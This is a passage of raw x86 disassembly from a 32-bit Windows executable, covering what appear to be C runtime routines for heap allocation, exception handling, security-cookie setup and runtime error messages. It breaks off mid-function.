  42702c:	jmp    0x42703b
  42702e:	add    ecx,0xffffffe0
  427031:	or     eax,0xffffffff
  427034:	xor    esi,esi
  427036:	shr    eax,cl
  427038:	mov    DWORD PTR [ebp-0x8],eax
  42703b:	mov    eax,ds:0x463a08
  427040:	mov    ebx,eax
  427042:	mov    DWORD PTR [ebp-0xc],esi
  427045:	cmp    ebx,edi
  427047:	jmp    0x42705d
  427049:	mov    ecx,DWORD PTR [ebx+0x4]
  42704c:	mov    edi,DWORD PTR [ebx]
  42704e:	and    ecx,DWORD PTR [ebp-0x8]
  427051:	and    edi,esi
  427053:	or     ecx,edi
  427055:	jne    0x427062
  427057:	add    ebx,0x14
  42705a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42705d:	mov    DWORD PTR [ebp+0x8],ebx
  427060:	jb     0x427049
  427062:	cmp    ebx,DWORD PTR [ebp-0x4]
  427065:	jne    0x42708b
  427067:	mov    ebx,edx
  427069:	jmp    0x42707c
  42706b:	mov    ecx,DWORD PTR [ebx+0x4]
  42706e:	mov    edi,DWORD PTR [ebx]
  427070:	and    ecx,DWORD PTR [ebp-0x8]
  427073:	and    edi,esi
  427075:	or     ecx,edi
  427077:	jne    0x427083
  427079:	add    ebx,0x14
  42707c:	cmp    ebx,eax
  42707e:	mov    DWORD PTR [ebp+0x8],ebx
  427081:	jb     0x42706b
  427083:	cmp    ebx,eax
  427085:	je     0x42711f
  42708b:	mov    DWORD PTR ds:0x463a08,ebx
  427091:	mov    eax,DWORD PTR [ebx+0x10]
  427094:	mov    edx,DWORD PTR [eax]
  427096:	cmp    edx,0xffffffff
  427099:	mov    DWORD PTR [ebp-0x4],edx
  42709c:	je     0x4270b2
  42709e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4270a5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4270a9:	and    ecx,DWORD PTR [ebp-0x8]
  4270ac:	and    edi,esi
  4270ae:	or     ecx,edi
  4270b0:	jne    0x4270e8
  4270b2:	mov    edx,DWORD PTR [eax+0xc4]
  4270b8:	and    edx,DWORD PTR [ebp-0x8]
  4270bb:	and    DWORD PTR [ebp-0x4],0x0
  4270bf:	lea    ecx,[eax+0x44]
  4270c2:	mov    esi,DWORD PTR [ecx]
  4270c4:	and    esi,DWORD PTR [ebp-0xc]
  4270c7:	or     edx,esi
  4270c9:	mov    esi,DWORD PTR [ebp-0xc]
  4270cc:	jne    0x4270e5
  4270ce:	mov    edx,DWORD PTR [ecx+0x84]
  4270d4:	and    edx,DWORD PTR [ebp-0x8]
  4270d7:	inc    DWORD PTR [ebp-0x4]
  4270da:	add    ecx,0x4
  4270dd:	mov    edi,DWORD PTR [ecx]
  4270df:	and    edi,esi
  4270e1:	or     edx,edi
  4270e3:	je     0x4270ce
  4270e5:	mov    edx,DWORD PTR [ebp-0x4]
  4270e8:	mov    ecx,edx
  4270ea:	imul   ecx,ecx,0x204
  4270f0:	lea    ecx,[ecx+eax*1+0x144]
  4270f7:	mov    DWORD PTR [ebp-0xc],ecx
  4270fa:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  4270fe:	xor    edi,edi
  427100:	and    ecx,esi
  427102:	jne    0x427171
  427104:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42710b:	and    ecx,DWORD PTR [ebp-0x8]
  42710e:	push   0x20
  427110:	pop    edi
  427111:	jmp    0x427171
  427113:	cmp    DWORD PTR [ebx+0x8],0x0
  427117:	jne    0x427124
  427119:	add    ebx,0x14
  42711c:	mov    DWORD PTR [ebp+0x8],ebx
  42711f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427122:	jb     0x427113
  427124:	cmp    ebx,DWORD PTR [ebp-0x4]
  427127:	jne    0x42714f
  427129:	mov    ebx,edx
  42712b:	jmp    0x427136
  42712d:	cmp    DWORD PTR [ebx+0x8],0x0
  427131:	jne    0x42713d
  427133:	add    ebx,0x14
  427136:	cmp    ebx,eax
  427138:	mov    DWORD PTR [ebp+0x8],ebx
  42713b:	jb     0x42712d
  42713d:	cmp    ebx,eax
  42713f:	jne    0x42714f
  427141:	call   0x426b55
  427146:	mov    ebx,eax
  427148:	test   ebx,ebx
  42714a:	mov    DWORD PTR [ebp+0x8],ebx
  42714d:	je     0x427167
  42714f:	push   ebx
  427150:	call   0x426c0c
  427155:	pop    ecx
  427156:	mov    ecx,DWORD PTR [ebx+0x10]
  427159:	mov    DWORD PTR [ecx],eax
  42715b:	mov    eax,DWORD PTR [ebx+0x10]
  42715e:	cmp    DWORD PTR [eax],0xffffffff
  427161:	jne    0x42708b
  427167:	xor    eax,eax
  427169:	jmp    0x4272e8
  42716e:	shl    ecx,1
  427170:	inc    edi
  427171:	test   ecx,ecx
  427173:	jge    0x42716e
  427175:	mov    ecx,DWORD PTR [ebp-0xc]
  427178:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42717c:	mov    ecx,DWORD PTR [edx]
  42717e:	sub    ecx,DWORD PTR [ebp-0x10]
  427181:	mov    esi,ecx
  427183:	sar    esi,0x4
  427186:	dec    esi
  427187:	cmp    esi,0x3f
  42718a:	mov    DWORD PTR [ebp-0x8],ecx
  42718d:	jle    0x427192
  42718f:	push   0x3f
  427191:	pop    esi
  427192:	cmp    esi,edi
  427194:	je     0x42729b
  42719a:	mov    ecx,DWORD PTR [edx+0x4]
  42719d:	cmp    ecx,DWORD PTR [edx+0x8]
  4271a0:	jne    0x4271fe
  4271a2:	cmp    edi,0x20
  4271a5:	mov    ebx,0x80000000
  4271aa:	jge    0x4271d2
  4271ac:	mov    ecx,edi
  4271ae:	shr    ebx,cl
  4271b0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271b3:	lea    edi,[eax+edi*1+0x4]
  4271b7:	not    ebx
  4271b9:	mov    DWORD PTR [ebp-0x14],ebx
  4271bc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4271c0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4271c4:	dec    BYTE PTR [edi]
  4271c6:	jne    0x4271fb
  4271c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4271cb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271ce:	and    DWORD PTR [ebx],ecx
  4271d0:	jmp    0x4271fe
  4271d2:	lea    ecx,[edi-0x20]
  4271d5:	shr    ebx,cl
  4271d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4271da:	lea    ecx,[eax+ecx*4+0xc4]
  4271e1:	lea    edi,[eax+edi*1+0x4]
  4271e5:	not    ebx
  4271e7:	and    DWORD PTR [ecx],ebx
  4271e9:	dec    BYTE PTR [edi]
  4271eb:	mov    DWORD PTR [ebp-0x14],ebx
  4271ee:	jne    0x4271fb
  4271f0:	mov    ebx,DWORD PTR [ebp+0x8]
  4271f3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271f6:	and    DWORD PTR [ebx+0x4],ecx
  4271f9:	jmp    0x4271fe
  4271fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271fe:	cmp    DWORD PTR [ebp-0x8],0x0
  427202:	mov    ecx,DWORD PTR [edx+0x8]
  427205:	mov    edi,DWORD PTR [edx+0x4]
  427208:	mov    DWORD PTR [ecx+0x4],edi
  42720b:	mov    ecx,DWORD PTR [edx+0x4]
  42720e:	mov    edi,DWORD PTR [edx+0x8]
  427211:	mov    DWORD PTR [ecx+0x8],edi
  427214:	je     0x4272a7
  42721a:	mov    ecx,DWORD PTR [ebp-0xc]
  42721d:	lea    ecx,[ecx+esi*8]
  427220:	mov    edi,DWORD PTR [ecx+0x4]
  427223:	mov    DWORD PTR [edx+0x8],ecx
  427226:	mov    DWORD PTR [edx+0x4],edi
  427229:	mov    DWORD PTR [ecx+0x4],edx
  42722c:	mov    ecx,DWORD PTR [edx+0x4]
  42722f:	mov    DWORD PTR [ecx+0x8],edx
  427232:	mov    ecx,DWORD PTR [edx+0x4]
  427235:	cmp    ecx,DWORD PTR [edx+0x8]
  427238:	jne    0x427298
  42723a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42723e:	mov    BYTE PTR [ebp+0xb],cl
  427241:	inc    cl
  427243:	cmp    esi,0x20
  427246:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42724a:	jge    0x42726f
  42724c:	cmp    BYTE PTR [ebp+0xb],0x0
  427250:	jne    0x42725d
  427252:	mov    edi,0x80000000
  427257:	mov    ecx,esi
  427259:	shr    edi,cl
  42725b:	or     DWORD PTR [ebx],edi
  42725d:	mov    ecx,esi
  42725f:	mov    edi,0x80000000
  427264:	shr    edi,cl
  427266:	mov    ecx,DWORD PTR [ebp-0x4]
  427269:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42726d:	jmp    0x427298
  42726f:	cmp    BYTE PTR [ebp+0xb],0x0
  427273:	jne    0x427282
  427275:	lea    ecx,[esi-0x20]
  427278:	mov    edi,0x80000000
  42727d:	shr    edi,cl
  42727f:	or     DWORD PTR [ebx+0x4],edi
  427282:	mov    ecx,DWORD PTR [ebp-0x4]
  427285:	lea    edi,[eax+ecx*4+0xc4]
  42728c:	lea    ecx,[esi-0x20]
  42728f:	mov    esi,0x80000000
  427294:	shr    esi,cl
  427296:	or     DWORD PTR [edi],esi
  427298:	mov    ecx,DWORD PTR [ebp-0x8]
  42729b:	test   ecx,ecx
  42729d:	je     0x4272aa
  42729f:	mov    DWORD PTR [edx],ecx
  4272a1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4272a5:	jmp    0x4272aa
  4272a7:	mov    ecx,DWORD PTR [ebp-0x8]
  4272aa:	mov    esi,DWORD PTR [ebp-0x10]
  4272ad:	add    edx,ecx
  4272af:	lea    ecx,[esi+0x1]
  4272b2:	mov    DWORD PTR [edx],ecx
  4272b4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4272b8:	mov    esi,DWORD PTR [ebp-0xc]
  4272bb:	mov    ecx,DWORD PTR [esi]
  4272bd:	test   ecx,ecx
  4272bf:	lea    edi,[ecx+0x1]
  4272c2:	mov    DWORD PTR [esi],edi
  4272c4:	jne    0x4272e0
  4272c6:	cmp    ebx,DWORD PTR ds:0x4639f8
  4272cc:	jne    0x4272e0
  4272ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4272d1:	cmp    ecx,DWORD PTR ds:0x463a10
  4272d7:	jne    0x4272e0
  4272d9:	and    DWORD PTR ds:0x4639f8,0x0
  4272e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4272e3:	mov    DWORD PTR [eax],ecx
  4272e5:	lea    eax,[edx+0x4]
  4272e8:	pop    edi
  4272e9:	pop    esi
  4272ea:	pop    ebx
  4272eb:	leave  
  4272ec:	ret    
  4272ed:	int3   
  4272ee:	int3   
  4272ef:	int3   
  4272f0:	push   esi
  4272f1:	inc    ebx
  4272f2:	xor    dh,BYTE PTR [eax]
  4272f4:	pop    eax
  4272f5:	inc    ebx
  4272f6:	xor    BYTE PTR [eax],dh
  4272f8:	push   ebp
  4272f9:	mov    ebp,esp
  4272fb:	sub    esp,0x8
  4272fe:	push   ebx
  4272ff:	push   esi
  427300:	push   edi
  427301:	push   ebp
  427302:	cld    
  427303:	mov    ebx,DWORD PTR [ebp+0xc]
  427306:	mov    eax,DWORD PTR [ebp+0x8]
  427309:	test   DWORD PTR [eax+0x4],0x6
  427310:	jne    0x427398
  427316:	mov    DWORD PTR [ebp-0x8],eax
  427319:	mov    eax,DWORD PTR [ebp+0x10]
  42731c:	mov    DWORD PTR [ebp-0x4],eax
  42731f:	lea    eax,[ebp-0x8]
  427322:	mov    DWORD PTR [ebx-0x4],eax
  427325:	mov    esi,DWORD PTR [ebx+0xc]
  427328:	mov    edi,DWORD PTR [ebx+0x8]
  42732b:	cmp    esi,0xffffffff
  42732e:	je     0x427391
  427330:	lea    ecx,[esi+esi*2]
  427333:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427338:	je     0x42737f
  42733a:	push   esi
  42733b:	push   ebp
  42733c:	lea    ebp,[ebx+0x10]
  42733f:	call   DWORD PTR [edi+ecx*4+0x4]
  427343:	pop    ebp
  427344:	pop    esi
  427345:	mov    ebx,DWORD PTR [ebp+0xc]
  427348:	or     eax,eax
  42734a:	je     0x42737f
  42734c:	js     0x42738a
  42734e:	mov    edi,DWORD PTR [ebx+0x8]
  427351:	push   ebx
  427352:	call   0x428280
  427357:	add    esp,0x4
  42735a:	lea    ebp,[ebx+0x10]
  42735d:	push   esi
  42735e:	push   ebx
  42735f:	call   0x4282c2
  427364:	add    esp,0x8
  427367:	lea    ecx,[esi+esi*2]
  42736a:	push   0x1
  42736c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427370:	call   0x428356
  427375:	mov    eax,DWORD PTR [edi+ecx*4]
  427378:	mov    DWORD PTR [ebx+0xc],eax
  42737b:	call   DWORD PTR [edi+ecx*4+0x8]
  42737f:	mov    edi,DWORD PTR [ebx+0x8]
  427382:	lea    ecx,[esi+esi*2]
  427385:	mov    esi,DWORD PTR [edi+ecx*4]
  427388:	jmp    0x42732b
  42738a:	mov    eax,0x0
  42738f:	jmp    0x4273ad
  427391:	mov    eax,0x1
  427396:	jmp    0x4273ad
  427398:	push   ebp
  427399:	lea    ebp,[ebx+0x10]
  42739c:	push   0xffffffff
  42739e:	push   ebx
  42739f:	call   0x4282c2
  4273a4:	add    esp,0x8
  4273a7:	pop    ebp
  4273a8:	mov    eax,0x1
  4273ad:	pop    ebp
  4273ae:	pop    edi
  4273af:	pop    esi
  4273b0:	pop    ebx
  4273b1:	mov    esp,ebp
  4273b3:	pop    ebp
  4273b4:	ret    
  4273b5:	push   ebp
  4273b6:	mov    ecx,DWORD PTR [esp+0x8]
  4273ba:	mov    ebp,DWORD PTR [ecx]
  4273bc:	mov    eax,DWORD PTR [ecx+0x1c]
  4273bf:	push   eax
  4273c0:	mov    eax,DWORD PTR [ecx+0x18]
  4273c3:	push   eax
  4273c4:	call   0x4282c2
  4273c9:	add    esp,0x8
  4273cc:	pop    ebp
  4273cd:	ret    0x4
  4273d0:	call   0x4252e9
  4273d5:	add    eax,0x8
  4273d8:	ret    
  4273d9:	push   0x14
  4273db:	push   0x4298c0
  4273e0:	call   0x425434
  4273e5:	mov    edi,DWORD PTR [ebp+0x8]
  4273e8:	xor    ebx,ebx
  4273ea:	cmp    edi,ebx
  4273ec:	jne    0x4273fc
  4273ee:	push   DWORD PTR [ebp+0xc]
  4273f1:	call   0x426152
  4273f6:	pop    ecx
  4273f7:	jmp    0x427580
  4273fc:	mov    esi,DWORD PTR [ebp+0xc]
  4273ff:	cmp    esi,ebx
  427401:	jne    0x42740f
  427403:	push   edi
  427404:	call   0x42603a
  427409:	pop    ecx
  42740a:	jmp    0x42757e
  42740f:	cmp    DWORD PTR ds:0x463c44,0x3
  427416:	jne    0x42754a
  42741c:	mov    DWORD PTR [ebp-0x1c],ebx
  42741f:	cmp    esi,0xffffffe0
  427422:	ja     0x427519
  427428:	push   0x4
  42742a:	call   0x4255ef
  42742f:	pop    ecx
  427430:	mov    DWORD PTR [ebp-0x4],ebx
  427433:	push   edi
  427434:	call   0x426812
  427439:	pop    ecx
  42743a:	mov    DWORD PTR [ebp-0x20],eax
  42743d:	cmp    eax,ebx
  42743f:	je     0x4274e9
  427445:	cmp    esi,DWORD PTR ds:0x463a04
  42744b:	ja     0x427499
  42744d:	push   esi
  42744e:	push   edi
  42744f:	push   eax
  427450:	call   0x426d12
  427455:	add    esp,0xc
  427458:	test   eax,eax
  42745a:	je     0x427461
  42745c:	mov    DWORD PTR [ebp-0x1c],edi
  42745f:	jmp    0x427499
  427461:	push   esi
  427462:	call   0x426ff1
  427467:	pop    ecx
  427468:	mov    DWORD PTR [ebp-0x1c],eax
  42746b:	cmp    eax,ebx
  42746d:	je     0x427499
  42746f:	mov    eax,DWORD PTR [edi-0x4]
  427472:	dec    eax
  427473:	mov    DWORD PTR [ebp-0x24],eax
  427476:	cmp    eax,esi
  427478:	jb     0x42747c
  42747a:	mov    eax,esi
  42747c:	push   eax
  42747d:	push   edi
  42747e:	push   DWORD PTR [ebp-0x1c]
  427481:	call   0x426170
  427486:	push   edi
  427487:	call   0x426812
  42748c:	mov    DWORD PTR [ebp-0x20],eax
  42748f:	push   edi
  427490:	push   eax
  427491:	call   0x42683d
  427496:	add    esp,0x18
  427499:	cmp    DWORD PTR [ebp-0x1c],ebx
  42749c:	jne    0x4274e9
  42749e:	cmp    esi,ebx
  4274a0:	jne    0x4274a8
  4274a2:	xor    esi,esi
  4274a4:	inc    esi
  4274a5:	mov    DWORD PTR [ebp+0xc],esi
  4274a8:	add    esi,0xf
  4274ab:	and    esi,0xfffffff0
  4274ae:	mov    DWORD PTR [ebp+0xc],esi
  4274b1:	push   esi
  4274b2:	push   ebx
  4274b3:	push   DWORD PTR ds:0x463c40
  4274b9:	call   DWORD PTR ds:0x429038
  4274bf:	mov    DWORD PTR [ebp-0x1c],eax
  4274c2:	cmp    eax,ebx
  4274c4:	je     0x4274e9
  4274c6:	mov    eax,DWORD PTR [edi-0x4]
  4274c9:	dec    eax
  4274ca:	mov    DWORD PTR [ebp-0x24],eax
  4274cd:	cmp    eax,esi
  4274cf:	jb     0x4274d3
  4274d1:	mov    eax,esi
  4274d3:	push   eax
  4274d4:	push   edi
  4274d5:	push   DWORD PTR [ebp-0x1c]
  4274d8:	call   0x426170
  4274dd:	push   edi
  4274de:	push   DWORD PTR [ebp-0x20]
  4274e1:	call   0x42683d
  4274e6:	add    esp,0x14
  4274e9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ed:	call   0x427541
  4274f2:	cmp    DWORD PTR [ebp-0x20],ebx
  4274f5:	jne    0x427519
  4274f7:	cmp    esi,ebx
  4274f9:	jne    0x4274fe
  4274fb:	xor    esi,esi
  4274fd:	inc    esi
  4274fe:	add    esi,0xf
  427501:	and    esi,0xfffffff0
  427504:	mov    DWORD PTR [ebp+0xc],esi
  427507:	push   esi
  427508:	push   edi
  427509:	push   ebx
  42750a:	push   DWORD PTR ds:0x463c40
  427510:	call   DWORD PTR ds:0x42910c
  427516:	mov    DWORD PTR [ebp-0x1c],eax
  427519:	mov    eax,DWORD PTR [ebp-0x1c]
  42751c:	cmp    eax,ebx
  42751e:	jne    0x427580
  427520:	cmp    DWORD PTR ds:0x4638c8,ebx
  427526:	je     0x427580
  427528:	push   esi
  427529:	call   0x427d12
  42752e:	pop    ecx
  42752f:	test   eax,eax
  427531:	jne    0x42741c
  427537:	jmp    0x42757e
  427539:	xor    ebx,ebx
  42753b:	mov    esi,DWORD PTR [ebp+0xc]
  42753e:	mov    edi,DWORD PTR [ebp+0x8]
  427541:	push   0x4
  427543:	call   0x42555b
  427548:	pop    ecx
  427549:	ret    
  42754a:	xor    eax,eax
  42754c:	cmp    esi,0xffffffe0
  42754f:	ja     0x427567
  427551:	cmp    esi,ebx
  427553:	jne    0x427558
  427555:	xor    esi,esi
  427557:	inc    esi
  427558:	push   esi
  427559:	push   edi
  42755a:	push   ebx
  42755b:	push   DWORD PTR ds:0x463c40
  427561:	call   DWORD PTR ds:0x42910c
  427567:	cmp    eax,ebx
  427569:	jne    0x427580
  42756b:	cmp    DWORD PTR ds:0x4638c8,ebx
  427571:	je     0x427580
  427573:	push   esi
  427574:	call   0x427d12
  427579:	pop    ecx
  42757a:	test   eax,eax
  42757c:	jne    0x42754a
  42757e:	xor    eax,eax
  427580:	call   0x42546f
  427585:	ret    
  427586:	push   0x10
  427588:	push   0x4298d0
  42758d:	call   0x425434
  427592:	cmp    DWORD PTR ds:0x463c44,0x3
  427599:	jne    0x4275d5
  42759b:	push   0x4
  42759d:	call   0x4255ef
  4275a2:	pop    ecx
  4275a3:	and    DWORD PTR [ebp-0x4],0x0
  4275a7:	mov    esi,DWORD PTR [ebp+0x8]
  4275aa:	push   esi
  4275ab:	call   0x426812
  4275b0:	pop    ecx
  4275b1:	mov    DWORD PTR [ebp-0x1c],eax
  4275b4:	test   eax,eax
  4275b6:	je     0x4275c3
  4275b8:	mov    esi,DWORD PTR [esi-0x4]
  4275bb:	sub    esi,0x9
  4275be:	mov    DWORD PTR [ebp-0x20],esi
  4275c1:	jmp    0x4275c6
  4275c3:	mov    esi,DWORD PTR [ebp-0x20]
  4275c6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275ca:	call   0x4275f3
  4275cf:	cmp    DWORD PTR [ebp-0x1c],0x0
  4275d3:	jne    0x4275e8
  4275d5:	push   DWORD PTR [ebp+0x8]
  4275d8:	push   0x0
  4275da:	push   DWORD PTR ds:0x463c40
  4275e0:	call   DWORD PTR ds:0x429110
  4275e6:	mov    esi,eax
  4275e8:	mov    eax,esi
  4275ea:	call   0x42546f
  4275ef:	ret    
  4275f0:	mov    esi,DWORD PTR [ebp-0x20]
  4275f3:	push   0x4
  4275f5:	call   0x42555b
  4275fa:	pop    ecx
  4275fb:	ret    
  4275fc:	push   ebp
  4275fd:	mov    ebp,esp
  4275ff:	sub    esp,0x10
  427602:	push   esi
  427603:	lea    eax,[ebp-0x8]
  427606:	push   eax
  427607:	call   DWORD PTR ds:0x429120
  42760d:	mov    esi,DWORD PTR [ebp-0x4]
  427610:	xor    esi,DWORD PTR [ebp-0x8]
  427613:	call   DWORD PTR ds:0x42911c
  427619:	xor    esi,eax
  42761b:	call   DWORD PTR ds:0x4290d8
  427621:	xor    esi,eax
  427623:	call   DWORD PTR ds:0x429118
  427629:	xor    esi,eax
  42762b:	lea    eax,[ebp-0x10]
  42762e:	push   eax
  42762f:	call   DWORD PTR ds:0x429114
  427635:	mov    eax,DWORD PTR [ebp-0xc]
  427638:	xor    eax,DWORD PTR [ebp-0x10]
  42763b:	xor    esi,eax
  42763d:	mov    DWORD PTR ds:0x462f30,esi
  427643:	jne    0x42764f
  427645:	mov    DWORD PTR ds:0x462f30,0xbb40e64e
  42764f:	pop    esi
  427650:	leave  
  427651:	ret    
  427652:	push   0x118
  427657:	push   0x429a80
  42765c:	call   0x425434
  427661:	mov    eax,ds:0x462f30
  427666:	xor    eax,DWORD PTR [ebp+0x4]
  427669:	mov    DWORD PTR [ebp-0x1c],eax
  42766c:	mov    eax,ds:0x463898
  427671:	xor    ecx,ecx
  427673:	cmp    eax,ecx
  427675:	je     0x427696
  427677:	mov    DWORD PTR [ebp-0x4],ecx
  42767a:	push   DWORD PTR [ebp+0xc]
  42767d:	push   DWORD PTR [ebp+0x8]
  427680:	call   eax
  427682:	pop    ecx
  427683:	pop    ecx
  427684:	or     DWORD PTR [ebp-0x4],0xffffffff
  427688:	jmp    0x427794
  42768d:	xor    eax,eax
  42768f:	inc    eax
  427690:	ret    
  427691:	mov    esp,DWORD PTR [ebp-0x18]
  427694:	jmp    0x427684
  427696:	mov    eax,DWORD PTR [ebp+0x8]
  427699:	dec    eax
  42769a:	je     0x4276af
  42769c:	mov    edi,0x429a5c
  4276a1:	mov    DWORD PTR [ebp-0x20],0x4299a8
  4276a8:	mov    esi,0xd4
  4276ad:	jmp    0x4276c0
  4276af:	mov    edi,0x429988
  4276b4:	mov    DWORD PTR [ebp-0x20],0x4298e8
  4276bb:	mov    esi,0xb9
  4276c0:	mov    BYTE PTR [ebp-0x24],cl
  4276c3:	push   0x104
  4276c8:	lea    eax,[ebp-0x128]
  4276ce:	push   eax
  4276cf:	push   ecx
  4276d0:	call   DWORD PTR ds:0x4290a8
  4276d6:	test   eax,eax
  4276d8:	jne    0x4276ed
  4276da:	push   0x4295dc
  4276df:	lea    eax,[ebp-0x128]
  4276e5:	push   eax
  4276e6:	call   0x425810
  4276eb:	pop    ecx
  4276ec:	pop    ecx
  4276ed:	lea    ebx,[ebp-0x128]
  4276f3:	lea    eax,[ebp-0x128]
  4276f9:	push   eax
  4276fa:	call   0x425a40
  4276ff:	pop    ecx
  427700:	add    eax,0xb
  427703:	cmp    eax,0x3c
  427706:	jbe    0x427731
  427708:	lea    eax,[ebp-0x128]
  42770e:	push   eax
  42770f:	call   0x425a40
  427714:	mov    ebx,eax
  427716:	lea    eax,[ebp-0x128]
  42771c:	sub    eax,0x31
  42771f:	add    ebx,eax
  427721:	push   0x3
  427723:	push   0x4295d8
  427728:	push   ebx
  427729:	call   0x425910
  42772e:	add    esp,0x10
  427731:	push   ebx
  427732:	call   0x425a40
  427737:	pop    ecx
  427738:	lea    eax,[eax+esi*1+0xc]
  42773c:	add    eax,0x3
  42773f:	and    eax,0xfffffffc
  427742:	call   0x425480
  427747:	mov    DWORD PTR [ebp-0x18],esp
  42774a:	mov    esi,esp
  42774c:	push   edi
  42774d:	push   esi
  42774e:	call   0x425810
  427753:	mov    edi,0x4295b8
  427758:	push   edi
  427759:	push   esi
  42775a:	call   0x425820
  42775f:	push   0x4298dc
  427764:	push   esi
  427765:	call   0x425820
  42776a:	push   ebx
  42776b:	push   esi
  42776c:	call   0x425820
  427771:	push   edi
  427772:	push   esi
  427773:	call   0x425820
  427778:	push   DWORD PTR [ebp-0x20]
  42777b:	push   esi
  42777c:	call   0x425820
  427781:	push   0x12010
  427786:	push   0x429590
  42778b:	push   esi
  42778c:	call   0x425712
  427791:	add    esp,0x3c
  427794:	push   0x3
  427796:	call   0x4248a2
  42779b:	int3   
  42779c:	push   0x38
  42779e:	push   0x429ea0
  4277a3:	call   0x425434
  4277a8:	xor    ebx,ebx
  4277aa:	cmp    DWORD PTR ds:0x4638bc,ebx
  4277b0:	jne    0x4277ea
  4277b2:	push   ebx
  4277b3:	push   ebx
  4277b4:	xor    esi,esi
  4277b6:	inc    esi
  4277b7:	push   esi
  4277b8:	push   0x429e9c
  4277bd:	push   0x100
  4277c2:	push   ebx
  4277c3:	call   DWORD PTR ds:0x42912c
  4277c9:	test   eax,eax
  4277cb:	je     0x4277d5
  4277cd:	mov    DWORD PTR ds:0x4638bc,esi
  4277d3:	jmp    0x4277ea
  4277d5:	call   DWORD PTR ds:0x429030
  4277db:	cmp    eax,0x78
  4277de:	jne    0x4277ea
  4277e0:	mov    DWORD PTR ds:0x4638bc,0x2
  4277ea:	cmp    DWORD PTR [ebp+0x14],ebx
  4277ed:	jle    0x42780a
  4277ef:	mov    ecx,DWORD PTR [ebp+0x14]
  4277f2:	mov    eax,DWORD PTR [ebp+0x10]
  4277f5:	dec    ecx
  4277f6:	cmp    BYTE PTR [eax],bl
  4277f8:	je     0x427802
  4277fa:	inc    eax
  4277fb:	cmp    ecx,ebx
  4277fd:	jne    0x4277f5
  4277ff:	or     ecx,0xffffffff
  427802:	or     eax,0xffffffff
  427805:	sub    eax,ecx
  427807:	add    DWORD PTR [ebp+0x14],eax
  42780a:	mov    eax,ds:0x4638bc
  42780f:	cmp    eax,0x2
  427812:	je     0x4279f4
  427818:	cmp    eax,ebx
  42781a:	je     0x4279f4
  427820:	cmp    eax,0x1
  427823:	jne    0x427a27
  427829:	xor    edi,edi
  42782b:	mov    DWORD PTR [ebp-0x1c],edi
  42782e:	mov    DWORD PTR [ebp-0x20],ebx
  427831:	mov    DWORD PTR [ebp-0x24],ebx
  427834:	cmp    DWORD PTR [ebp+0x20],ebx
  427837:	jne    0x427841
  427839:	mov    eax,ds:0x4638b4
  42783e:	mov    DWORD PTR [ebp+0x20],eax
  427841:	push   ebx
  427842:	push   ebx
  427843:	push   DWORD PTR [ebp+0x14]
  427846:	push   DWORD PTR [ebp+0x10]
  427849:	xor    eax,eax
  42784b:	cmp    DWORD PTR [ebp+0x24],ebx
  42784e:	setne  al
  427851:	lea    eax,[eax*8+0x1]
  427858:	push   eax
  427859:	push   DWORD PTR [ebp+0x20]
  42785c:	call   DWORD PTR ds:0x429128
  427862:	mov    esi,eax
  427864:	mov    DWORD PTR [ebp-0x28],esi
  427867:	cmp    esi,ebx
  427869:	je     0x427a27
  42786f:	mov    DWORD PTR [ebp-0x4],0x1
  427876:	lea    eax,[esi+esi*1]
  427879:	add    eax,0x3
  42787c:	and    eax,0xfffffffc
  42787f:	call   0x425480
  427884:	mov    DWORD PTR [ebp-0x18],esp
  427887:	mov    eax,esp
  427889:	mov    DWORD PTR [ebp-0x2c],eax
  42788c:	or     DWORD PTR [ebp-0x4],0xffffffff
  427890:	jmp    0x4278ad
  427892:	xor    eax,eax
  427894:	inc    eax
  427895:	ret    
  427896:	mov    esp,DWORD PTR [ebp-0x18]
  427899:	call   0x4288c5
  42789e:	xor    ebx,ebx
  4278a0:	mov    DWORD PTR [ebp-0x2c],ebx
  4278a3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4278a7:	mov    edi,DWORD PTR [ebp-0x1c]
  4278aa:	mov    esi,DWORD PTR [ebp-0x28]
  4278ad:	cmp    DWORD PTR [ebp-0x2c],ebx
  4278b0:	jne    0x4278ce
  4278b2:	lea    eax,[esi+esi*1]
  4278b5:	push   eax
  4278b6:	call   0x426152
  4278bb:	pop    ecx
  4278bc:	mov    DWORD PTR [ebp-0x2c],eax
  4278bf:	cmp    eax,ebx
  4278c1:	je     0x427a27
  4278c7:	mov    DWORD PTR [ebp-0x20],0x1
  4278ce:	push   esi
  4278cf:	push   DWORD PTR [ebp-0x2c]
  4278d2:	push   DWORD PTR [ebp+0x14]
  4278d5:	push   DWORD PTR [ebp+0x10]
  4278d8:	push   0x1
  4278da:	push   DWORD PTR [ebp+0x20]
  4278dd:	call   DWORD PTR ds:0x429128
  4278e3:	test   eax,eax
  4278e5:	je     0x4279d1
  4278eb:	push   ebx
  4278ec:	push   ebx
  4278ed:	push   esi
  4278ee:	push   DWORD PTR [ebp-0x2c]
  4278f1:	push   DWORD PTR [ebp+0xc]
  4278f4:	push   DWORD PTR [ebp+0x8]
  4278f7:	call   DWORD PTR ds:0x42912c
  4278fd:	mov    edi,eax
  4278ff:	mov    DWORD PTR [ebp-0x1c],edi
  427902:	cmp    edi,ebx
  427904:	je     0x4279d1
